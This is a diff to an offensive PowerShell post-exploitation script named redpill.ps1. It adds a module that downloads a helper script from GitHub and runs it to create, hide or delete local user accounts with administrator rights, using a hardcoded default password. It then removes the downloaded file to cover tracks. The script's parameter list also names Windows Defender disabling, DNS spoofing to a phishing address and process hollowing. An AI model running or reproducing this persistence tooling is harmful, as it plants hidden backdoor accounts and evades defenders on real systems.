@@ -82,16 +82,19 @@
    [int]$Volume='88', [int]$Screenshot='0', [int]$Timmer='10',
    [string]$FolderRigths="false", [string]$GroupName="false",
    [string]$Extension="false", [string]$FilePath="false",
+   [string]$UserName="false", [string]$Password="false",
    [string]$MetaData="false", [int]$ButtonType='0',
    [int]$SPort='8080', [string]$PEHollow="false",
    [int]$Limmit='5', [string]$AppLocker="false",
    [string]$Dicionary="$Env:TMP\passwords.txt",
    [string]$Domain="www.facebook.com",
    [string]$ServiceName="WinDefend",
+   [string]$HiddenUser="false",
    [string]$DisableAV="false",
    [string]$ToIPaddr="false",
    [string]$DnsSpoof="false",
-   [string]$Sponsor="false"
+   [string]$Sponsor="false",
+   [string]$Action="false"
 )
 
 
@@ -172,6 +175,7 @@ $ListParameters = @"
   -NetTrace         Enum                 Agressive sytem enumeration with netsh {native}
   -DnsSpoof         Enum|Redirect|Clear  Redirect Domain Names to our Phishing IP address
   -DisableAV        Query|Start|Stop     Disable Windows Defender Service (WinDefend)
+  -HiddenUser       Query|Create|Delete  Query \ Create \ Delete Hidden User Accounts
 
 "@;
 echo $ListParameters > $Env:TMP\mytable.mt
@@ -2172,6 +2176,125 @@ If($DisableAV -ne "false"){
 }
 
 
+
+If($HiddenUser -ne "false"){
+
+   <#
+   .SYNOPSIS
+      Query \ Create \ Delete Hidden User Accounts 
+
+   .DESCRIPTION
+      This CmdLet Querys, Creates or Deletes windows hidden accounts.
+      It also allow users to set the account 'Visible' or 'Hidden' state.
+
+   .NOTES
+      Required Dependencies: Administrator Privileges on shell
+      Mandatory requirements to {Create|Delete} or set account {Visible|Hidden} state
+      The new created user account will have 'administrators' privileges rigths set.
+
+   .Parameter Action
+      Accepts argument: Query, Create, Delete, Visible, Hidden
+
+   .Parameter UserName
+      Accepts the User Account Name (default: SSAredTeam)
+
+   .Parameter Password
+      Accepts the User Account Password (default: mys3cr3tp4ss)
+
+   .EXAMPLE
+      PS C:\> powershell -File redpill.ps1 -Action Query
+      Enumerate ALL Account's present in local system
+
+   .EXAMPLE
+      PS C:\> powershell -File redpill.ps1 -Action Create -UserName "pedro"
+      Creates 'pedro' hidden account without password access and 'Adminitrator' privs
+
+   .EXAMPLE
+      PS C:\> powershell -File redpill.ps1 -Action Create -UserName "pedro" -Password "mys3cr3tp4ss"
+      Creates 'pedro' hidden account with password 'mys3cr3tp4ss' and 'Adminitrator' privs
+
+   .EXAMPLE
+      PS C:\> powershell -File redpill.ps1 -Action Visible -UserName "pedro"
+      Makes 'pedro' User Account visible on logon screen
+
+   .EXAMPLE
+      PS C:\> powershell -File redpill.ps1 -Action Hidden -UserName "pedro"
+      Makes 'pedro' User Account Hidden on logon screen (default)
+
+   .EXAMPLE
+      PS C:\> powershell -File redpill.ps1 -Action Delete -UserName "pedro"
+      Deletes 'pedro' hidden account
+
+   .OUTPUTS
+      Enabled Name               LastLogon           PasswordLastSet     PasswordRequired
+      ------- ----               ---------           ---------------     ----------------
+      False   Administrador                                                          True
+      False   Convidado                                                             False
+      False   DefaultAccount                                                        False
+       True   pedro              20/03/2021 01:50:09 01/03/2021 19:53:46             True
+      False   WDAGUtilityAccount                     01/03/2021 18:58:42             True
+
+   #>
+
+   ## Download HiddenUser.ps1 from my GitHub
+   If(-not(Test-Path -Path "$Env:TMP\HiddenUser.ps1")){## Download HiddenUser.ps1 from my GitHub repository
+      Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/HiddenUser.ps1 -Destination $Env:TMP\HiddenUser.ps1 -ErrorAction SilentlyContinue|Out-Null
+      ## Check downloaded file integrity => FileSizeKBytes
+      $SizeDump = ((Get-Item -Path "$Env:TMP\HiddenUser.ps1" -EA SilentlyContinue).length/1KB)
+      If($SizeDump -lt 12){## Corrupted download detected => DefaultFileSize: 12,6044921875/KB
+         Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
+         If(Test-Path -Path "$Env:TMP\HiddenUser.ps1"){Remove-Item -Path "$Env:TMP\HiddenUser.ps1" -Force}
+         Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
+      }   
+   }
+
+   ## Run auxiliary module
+   If($HiddenUser -ieq "Query"){## Query ALL user account's
+
+      If(-not($UserName) -or $UserName -ieq "false"){
+
+         powershell -File "$Env:TMP\HiddenUser.ps1" -Action Query
+
+      }Else{## Query Sellected user account
+
+         powershell -File "$Env:TMP\HiddenUser.ps1" -Action Query -UserName "$UserName"
+
+      }
+
+   }ElseIf($HiddenUser -ieq "Create"){
+
+      If(-not($Password) -or $Password -ieq "false"){
+
+         powershell -File "$Env:TMP\HiddenUser.ps1" -Action Create -UserName "$UserName"
+
+      }Else{
+
+         powershell -File "$Env:TMP\HiddenUser.ps1" -Action Create -UserName "$UserName" -Password "$Password"
+
+      }
+
+   }ElseIf($HiddenUser -ieq "Delete"){
+
+      powershell -File "$Env:TMP\HiddenUser.ps1" -Action Delete -UserName "$UserName"
+
+   }ElseIf($HiddenUser -ieq "Visible"){
+
+      powershell -File "$Env:TMP\HiddenUser.ps1" -Action Visible -UserName "$UserName"
+
+   }ElseIf($HiddenUser -ieq "Hidden"){
+
+      powershell -File "$Env:TMP\HiddenUser.ps1" -Action HIdden -UserName "$UserName"
+
+   }
+
+   ## Clean Artifacts left behind
+   If(Test-Path -Path "$Env:TMP\HiddenUser.ps1"){Remove-Item -Path "$Env:TMP\HiddenUser.ps1" -Force}
+}
+
+
+
+
+
 ## --------------------------------------------------------------
 ##       HELP =>  * PARAMETERS DETAILED DESCRIPTION *
 ## --------------------------------------------------------------
@@ -3499,6 +3622,67 @@ $HelpParameters = @"
       StartType        : Automatic
       CurrentStatus    : Stopped
       ManualQuery      : Get-Service -Name WinDefend
+   #>!bye..
+
+"@;
+Write-Host "$HelpParameters"
+}ElseIf($Help -ieq "HiddenUser"){
+$HelpParameters = @"
+
+   <#!Help.
+   .SYNOPSIS
+      Helper - Query \ Create \ Delete Hidden User Accounts 
+
+   .DESCRIPTION
+      This CmdLet Querys, Creates or Deletes windows hidden accounts.
+      It also allow users to set the account 'Visible' or 'Hidden' state.
+
+   .NOTES
+      Required Dependencies: Administrator Privileges on shell
+      Mandatory requirements to {Create|Delete} or set account {Visible|Hidden} state
+      The new created user account will have 'administrators' privileges rigths set.
+
+   .Parameter HiddenUser
+      Accepts arguments: Query, Create, Delete, Visible, Hidden
+
+   .Parameter UserName
+      Accepts the User Account Name (default: SSAredTeam)
+
+   .Parameter Password
+      Accepts the User Account Password (default: mys3cr3tp4ss)
+
+   .EXAMPLE
+      PS C:\> powershell -File redpill.ps1 -HiddenUser Query
+      Enumerate ALL Account's present in local system
+
+   .EXAMPLE
+      PS C:\> powershell -File redpill.ps1 -HiddenUser Create -UserName "pedro"
+      Creates 'pedro' hidden account without password access and 'Administrator' privs
+
+   .EXAMPLE
+      PS C:\> powershell -File redpill.ps1 -HiddenUser Create -UserName "pedro" -Password "mys3cr3tp4ss"
+      Creates 'pedro' hidden account with password 'mys3cr3tp4ss' and 'Administrator' privs
+
+   .EXAMPLE
+      PS C:\> powershell -File redpill.ps1 -HiddenUser Visible -UserName "pedro"
+      Makes 'pedro' User Account visible on logon screen
+
+   .EXAMPLE
+      PS C:\> powershell -File redpill.ps1 -HiddenUser Hidden -UserName "pedro"
+      Makes 'pedro' User Account Hidden on logon screen (default)
+
+   .EXAMPLE
+      PS C:\> powershell -File redpill.ps1 -HiddenUser Delete -UserName "pedro"
+      Deletes 'pedro' hidden account
+
+   .OUTPUTS
+      Enabled Name               LastLogon           PasswordLastSet     PasswordRequired
+      ------- ----               ---------           ---------------     ----------------
+      False   Administrador                                                          True
+      False   Convidado                                                             False
+      False   DefaultAccount                                                        False
+       True   pedro              20/03/2021 01:50:09 01/03/2021 19:53:46             True
+      False   WDAGUtilityAccount                     01/03/2021 18:58:42             True
    #>!bye..
 
 "@;
